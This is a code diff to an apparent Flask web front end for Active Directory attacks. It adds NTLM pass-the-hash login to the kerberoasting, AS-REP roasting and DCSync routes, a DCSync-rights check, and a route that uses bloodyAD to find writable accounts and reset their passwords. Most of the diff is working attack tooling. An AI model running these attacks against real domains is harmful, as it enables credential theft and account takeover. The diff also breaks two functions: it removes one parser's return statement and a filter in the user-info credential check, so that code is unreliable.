@@ -44,7 +44,7 @@ from ..utils.zerologon import (
     restore_machine_account_password_bloodyad,
 )
 
-REQUIRED_CRED_KEYS = ("username", "password", "domain", "dc_ip")
+REQUIRED_CRED_KEYS = ("username", "domain", "dc_ip")
 
 DANGEROUS_GROUP_DETAILS = {
     "Domain Admins": {
@@ -279,7 +279,41 @@ def _get_creds():
 
 
 def _missing_creds(creds):
-    return [key for key in REQUIRED_CRED_KEYS if not creds.get(key)]
+    missing = [key for key in REQUIRED_CRED_KEYS if not creds.get(key)]
+    if not creds.get("password") and not creds.get("ntlm_hash"):
+        missing.append("auth")
+    return missing
+
+
+def _default_auth_method(creds):
+    if creds.get("password"):
+        return "password"
+    if creds.get("ntlm_hash"):
+        return "ntlm"
+    return ""
+
+
+def _resolve_auth_method(creds, requested):
+    requested = (requested or "").strip().lower()
+    password = (creds.get("password") or "").strip()
+    ntlm_hash = (creds.get("ntlm_hash") or "").strip()
+
+    if requested not in {"password", "ntlm"}:
+        if password:
+            return "password", None
+        if ntlm_hash:
+            return "ntlm", None
+        return "", "Please provide a password or NTLM hash in the active profile."
+
+    if requested == "password":
+        if not password:
+            return "", "Selected auth method requires a password."
+        return "password", None
+
+    if not ntlm_hash:
+        return "", "Selected auth method requires an NTLM hash."
+
+    return "ntlm", None
 
 
 def _render_exploit(template, creds, results, error, status_message, action, **extra):
@@ -292,6 +326,95 @@ def _render_exploit(template, creds, results, error, status_message, action, **e
         action=action,
         **extra,
     )
+
+
+def _dcsync_rights_from_sd(output, current_username):
+    if not output or not current_username:
+        return []
+
+    username = current_username.strip().lower()
+    rights = []
+    current = {}
+
+    def flush_entry(entry):
+        trustee = (entry.get("trustee") or "").strip().lower()
+        right = (entry.get("right") or "").upper()
+        object_type = (entry.get("object_type") or "")
+
+        if trustee != username:
+            return
+        if "CONTROL_ACCESS" not in right:
+            return
+        if "DS-Replication-Get-Changes" not in object_type:
+            return
+
+        rights.append(object_type.strip())
+
+    for line in output.splitlines():
+        stripped = line.strip()
+        if not stripped:
+            continue
+
+        if ".Trustee:" in stripped:
+            flush_entry(current)
+            current = {}
+
+        match = re.match(r"nTSecurityDescriptor\.ACL\.\d+\.(\w+):\s*(.+)", stripped)
+        if not match:
+            continue
+        key = match.group(1).strip().lower()
+        value = match.group(2).strip()
+        if key == "trustee":
+            current["trustee"] = value
+        elif key == "right":
+            current["right"] = value
+        elif key == "objecttype":
+            current["object_type"] = value
+
+    flush_entry(current)
+    return sorted(set(rights))
+
+
+def _check_dcsync_bloodyad(creds, auth_method):
+    domain_dn = domain_to_dn(creds.get("domain", ""))
+    if not domain_dn:
+        return None, "Missing domain information."
+
+    command = [
+        "bloodyAD",
+        "--host",
+        creds.get("dc_ip", ""),
+        "-d",
+        creds.get("domain", ""),
+        "-u",
+        creds.get("username", ""),
+    ]
+    if auth_method == "ntlm":
+        command += ["-p", f":{creds.get('ntlm_hash', '')}", "-f", "rc4"]
+    else:
+        command += ["-p", creds.get("password", "")]
+    command += [
+        "get",
+        "object",
+        domain_dn,
+        "--resolve-sd",
+        "--attr",
+        "nTSecurityDescriptor",
+    ]
+
+    result = subprocess.run(command, capture_output=True, text=True)
+    if result.returncode != 0:
+        message = result.stderr.strip() or result.stdout.strip() or "Unknown error"
+        return None, f"bloodyAD failed: {message}"
+
+    output = result.stdout or result.stderr
+    hits = _dcsync_rights_from_sd(output, creds.get("username"))
+    if hits:
+        lines = ["User HAS DCSync rights:"]
+        for entry in hits:
+            lines.append(f"- {entry}")
+        return lines, None
+    return ["User does NOT have DCSync rights."], None
 
 
 def _parse_bloodyad_output(output):
@@ -338,8 +461,6 @@ def _parse_bloodyad_membership_output(output):
         if value:
             matches.append(value)
 
-    return matches
-
 
 def _parse_bloodyad_members(output):
     if not output:
@@ -361,6 +482,80 @@ def _parse_bloodyad_members(output):
 
     return sorted(set(members))
 
+
+def _is_container_dn(distinguished_name):
+    if not distinguished_name:
+        return True
+
+    dn = distinguished_name.strip()
+    upper = dn.upper()
+    if upper.startswith("OU="):
+        return True
+
+    container_prefixes = (
+        "CN=USERS,",
+        "CN=COMPUTERS,",
+        "CN=SYSTEM,",
+        "CN=BUILTIN,",
+        "CN=FOREIGNSECURITYPRINCIPALS,",
+        "CN=DOMAIN CONTROLLERS,",
+        "CN=CONFIGURATION,",
+        "CN=SCHEMA,",
+        "CN=LOSTANDFOUND,",
+        "CN=MANAGEDSERVICEACCOUNTS,",
+    )
+    return upper.startswith(container_prefixes)
+
+
+def _parse_genericall_targets(output, *, current_username=None):
+    if not output:
+        return []
+
+    targets = set()
+    current_target = None
+    current_has_write = False
+    current_is_user = False
+    skip_current = (current_username or "").strip().lower()
+
+    for line in output.splitlines():
+        stripped = line.strip()
+        if not stripped:
+            continue
+
+        if stripped.lower().startswith("distinguishedname:"):
+            if current_target and current_has_write and current_is_user:
+                targets.add(current_target)
+            dn_value = stripped.split(":", 1)[1].strip()
+            current_target = clean_dn_name(dn_value)
+            current_is_user = not _is_container_dn(dn_value)
+            if current_target.upper().startswith("S-1-"):
+                current_is_user = False
+            current_has_write = False
+            continue
+
+        if current_target and current_is_user:
+            match = re.match(r"([A-Za-z0-9-]+)\s*:\s*(.+)", stripped)
+            if not match:
+                continue
+            attr = match.group(1).strip().lower()
+            value = match.group(2).strip().upper()
+            if attr == "permission" and "WRITE" in value:
+                current_has_write = True
+
+    if current_target and current_has_write and current_is_user:
+        targets.add(current_target)
+
+    filtered = []
+    for name in sorted(targets):
+        lowered = name.lower()
+        if skip_current and lowered == skip_current:
+            continue
+        if name.upper().startswith("S-1-"):
+            continue
+        filtered.append(name)
+
+    return filtered
+
 # Index
 @main_bp.route("/", methods=["GET", "POST"])
 def index():
@@ -379,6 +574,7 @@ def index():
         set_active_profile(profile_name)
         form.username.data = profile_data.get("username", "")
         form.password.data = profile_data.get("password", "")
+        form.ntlm_hash.data = profile_data.get("ntlm_hash", "")
         form.domain.data = profile_data.get("domain", "")
         form.dc_ip.data = profile_data.get("dc_ip", "")
         form.dc_fqdn.data = profile_data.get("dc_fqdn", "")
@@ -402,6 +598,7 @@ def index():
             form.profile_select.data = ""
             form.username.data = ""
             form.password.data = ""
+            form.ntlm_hash.data = ""
             form.domain.data = ""
             form.dc_ip.data = ""
             form.dc_fqdn.data = ""
@@ -418,6 +615,7 @@ def index():
                 profile_data = {
                     "username": form.username.data or "",
                     "password": form.password.data or "",
+                    "ntlm_hash": form.ntlm_hash.data or "",
                     "domain": form.domain.data or "",
                     "dc_ip": form.dc_ip.data or "",
                     "dc_fqdn": form.dc_fqdn.data or "",
@@ -456,13 +654,21 @@ def kerberoast():
     error = None
     status_message = None
     action = None
+    auth_method = _default_auth_method(creds)
 
     if request.method == "POST":
         action = request.form.get("action")
+        auth_method, auth_error = _resolve_auth_method(
+            creds,
+            request.form.get("auth_method"),
+        )
         missing = _missing_creds(creds)
         if missing:
             error = "Please submit credentials and domain settings first."
+        elif auth_error:
+            error = auth_error
         else:
+            ntlm_hash = creds.get("ntlm_hash") if auth_method == "ntlm" else None
             if action == "crack":
                 target_user = request.form.get("target_user") or "Unknown"
                 status_message = f"Cracking is disabled in this build. ({target_user})"
@@ -471,14 +677,16 @@ def kerberoast():
                     creds["domain"],
                     creds["username"],
                     creds["password"],
-                    creds["dc_ip"]
+                    creds["dc_ip"],
+                    ntlm_hash=ntlm_hash,
                 )
             else:
                 results = check_kerberoast(
                     creds["domain"],
                     creds["username"],
                     creds["password"],
-                    creds["dc_ip"]
+                    creds["dc_ip"],
+                    ntlm_hash=ntlm_hash,
                 )
             
     return _render_exploit(
@@ -488,6 +696,7 @@ def kerberoast():
         error,
         status_message,
         action,
+        auth_method=auth_method,
     )
 
 
@@ -499,26 +708,36 @@ def asreproast():
     error = None
     status_message = None
     action = None
+    auth_method = _default_auth_method(creds)
 
     if request.method == "POST":
         action = request.form.get("action")
+        auth_method, auth_error = _resolve_auth_method(
+            creds,
+            request.form.get("auth_method"),
+        )
         missing = _missing_creds(creds)
         if missing:
             error = "Please submit credentials and domain settings first."
+        elif auth_error:
+            error = auth_error
         else:
+            ntlm_hash = creds.get("ntlm_hash") if auth_method == "ntlm" else None
             if action == "exploit":
                 results = run_asreproast(
                     creds["domain"],
                     creds["username"],
                     creds["password"],
-                    creds["dc_ip"]
+                    creds["dc_ip"],
+                    ntlm_hash=ntlm_hash,
                 )
             else:
                 results = check_asreproast(
                     creds["domain"],
                     creds["username"],
                     creds["password"],
-                    creds["dc_ip"]
+                    creds["dc_ip"],
+                    ntlm_hash=ntlm_hash,
                 )
 
     return _render_exploit(
@@ -528,6 +747,7 @@ def asreproast():
         error,
         status_message,
         action,
+        auth_method=auth_method,
     )
 
 @main_bp.route("/dcsync", methods=["GET", "POST"])
@@ -537,34 +757,35 @@ def dcsync():
     error = None
     status_message = None
     action = None
+    auth_method = _default_auth_method(creds)
 
     if request.method == "POST":
         action = request.form.get("action")
+        auth_method, auth_error = _resolve_auth_method(
+            creds,
+            request.form.get("auth_method"),
+        )
 
         missing = _missing_creds(creds)
 
         if missing:
             error = "Please submit credentials and domain settings first."
-
+        elif auth_error:
+            error = auth_error
         else:
+            ntlm_hash = creds.get("ntlm_hash") if auth_method == "ntlm" else None
             if action == "exploit":
                 results = run_dcsync(
                     creds["domain"],
                     creds["username"],
                     creds["password"],
-                    creds["dc_ip"]
+                    creds["dc_ip"],
+                    ntlm_hash=ntlm_hash,
                 )
             else:
-                results = check_dcsync(
-                    creds["domain"],
-                    creds["username"],
-                    creds["password"],
-                    creds["dc_ip"]
-                )
-                if results:
-                    status_message = "DCSync attack successful."
-                elif not error:
-                    status_message = "DCSync executed but no Administrator credential found."
+                results, error = _check_dcsync_bloodyad(creds, auth_method)
+                if results and not error:
+                    status_message = "DCSync check completed."
             
     return _render_exploit(
         "dcsync.html",
@@ -573,6 +794,7 @@ def dcsync():
         error,
         status_message,
         action,
+        auth_method=auth_method,
     )
 
 
@@ -672,6 +894,188 @@ def zerologon():
         restore_use_profile=restore_use_profile,
     )
 
+
+@main_bp.route("/writable", methods=["GET", "POST"])
+def writable():
+    results = []
+    error = None
+    status_message = None
+
+    profiles = fetch_profiles()
+    active_profile = get_active_profile()
+
+    def get_profile_creds(profile_name):
+        profile = profiles.get(profile_name, {})
+        return {
+            "dc": (profile.get("dc_ip") or profile.get("dc_fqdn") or "").strip(),
+            "domain": (profile.get("domain") or "").strip(),
+            "username": (profile.get("username") or "").strip(),
+            "password": (profile.get("password") or "").strip(),
+            "ntlm_hash": (profile.get("ntlm_hash") or "").strip(),
+        }
+
+    creds = get_profile_creds(active_profile) if active_profile in profiles else {
+        "dc": "",
+        "domain": "",
+        "username": "",
+        "password": "",
+        "ntlm_hash": "",
+    }
+
+    selected_target = ""
+    auth_method = _default_auth_method(creds)
+
+    if request.method == "POST":
+        action = request.form.get("action") or ""
+        if action == "use_profile":
+            selected = (request.form.get("profile_select") or "").strip()
+            if selected and selected in profiles:
+                set_active_profile(selected)
+                active_profile = selected
+                creds = get_profile_creds(selected)
+                auth_method = _default_auth_method(creds)
+                status_message = f"Using profile: {selected}"
+            else:
+                error = "Please select a saved profile to use."
+        elif action == "exploit":
+            selected_target = (request.form.get("target_username") or "").strip()
+            new_password = (request.form.get("new_password") or "").strip()
+            auth_method, auth_error = _resolve_auth_method(
+                creds,
+                request.form.get("auth_method"),
+            )
+            missing = [
+                key
+                for key in ("dc", "domain", "username")
+                if not creds.get(key)
+            ]
+            if not creds.get("password") and not creds.get("ntlm_hash"):
+                missing.append("auth")
+            if missing:
+                error = "Please select a profile with domain controller, domain, username, and password or NTLM hash."
+            elif auth_error:
+                error = auth_error
+            elif not selected_target or not new_password:
+                error = "Please select a target user and provide a new password."
+            else:
+                command = [
+                    "bloodyAD",
+                    "--host",
+                    creds["dc"],
+                    "-d",
+                    creds["domain"],
+                    "-u",
+                    creds["username"],
+                ]
+                if auth_method == "ntlm":
+                    command += ["-p", f":{creds['ntlm_hash']}", "-f", "rc4"]
+                else:
+                    command += ["-p", creds["password"]]
+                command += [
+                    "set",
+                    "password",
+                    selected_target,
+                    new_password,
+                ]
+                result = subprocess.run(command, capture_output=True, text=True)
+                if result.returncode != 0:
+                    message = result.stderr.strip() or result.stdout.strip() or "Unknown error"
+                    error = f"bloodyAD failed: {message}"
+                else:
+                    status_message = f"Password updated for {selected_target}."
+
+            if not error:
+                refresh_command = [
+                    "bloodyAD",
+                    "--host",
+                    creds["dc"],
+                    "-d",
+                    creds["domain"],
+                    "-u",
+                    creds["username"],
+                ]
+                if auth_method == "ntlm":
+                    refresh_command += ["-p", f":{creds['ntlm_hash']}", "-f", "rc4"]
+                else:
+                    refresh_command += ["-p", creds["password"]]
+                refresh_command += [
+                    "get",
+                    "writable",
+                    "--right",
+                    "WRITE",
+                ]
+                refresh_result = subprocess.run(
+                    refresh_command,
+                    capture_output=True,
+                    text=True,
+                )
+                if refresh_result.returncode == 0:
+                    output = refresh_result.stdout or refresh_result.stderr
+                    results = _parse_genericall_targets(
+                        output,
+                        current_username=creds.get("username"),
+                    )
+        else:
+            auth_method, auth_error = _resolve_auth_method(
+                creds,
+                request.form.get("auth_method"),
+            )
+            missing = [
+                key
+                for key in ("dc", "domain", "username")
+                if not creds.get(key)
+            ]
+            if not creds.get("password") and not creds.get("ntlm_hash"):
+                missing.append("auth")
+            if missing:
+                error = "Please select a profile with domain controller, domain, username, and password or NTLM hash."
+            elif auth_error:
+                error = auth_error
+            else:
+                command = [
+                    "bloodyAD",
+                    "--host",
+                    creds["dc"],
+                    "-d",
+                    creds["domain"],
+                    "-u",
+                    creds["username"],
+                ]
+                if auth_method == "ntlm":
+                    command += ["-p", f":{creds['ntlm_hash']}", "-f", "rc4"]
+                else:
+                    command += ["-p", creds["password"]]
+                command += [
+                    "get",
+                    "writable",
+                    "--right",
+                    "WRITE",
+                ]
+                result = subprocess.run(command, capture_output=True, text=True)
+                if result.returncode != 0:
+                    message = result.stderr.strip() or result.stdout.strip() or "Unknown error"
+                    error = f"bloodyAD failed: {message}"
+                else:
+                    output = result.stdout or result.stderr
+                    results = _parse_genericall_targets(
+                        output,
+                        current_username=creds.get("username"),
+                    )
+                    if not results:
+                        status_message = "No GenericAll targets detected."
+
+    return render_template(
+        "writable.html",
+        results=results,
+        error=error,
+        status_message=status_message,
+        creds=creds,
+        selected_target=selected_target,
+        auth_method=auth_method,
+        profiles=profiles,
+        active_profile=active_profile,
+    )
+
 # Others
 @main_bp.route("/health")
 def health():
@@ -698,7 +1102,6 @@ def user_info():
             missing = [
                 key
                 for key in ("username", "domain", "password")
-                if not creds.get(key)
             ]
             dc_host = creds.get("dc_fqdn") or creds.get("dc_ip")
             if missing or not dc_host:
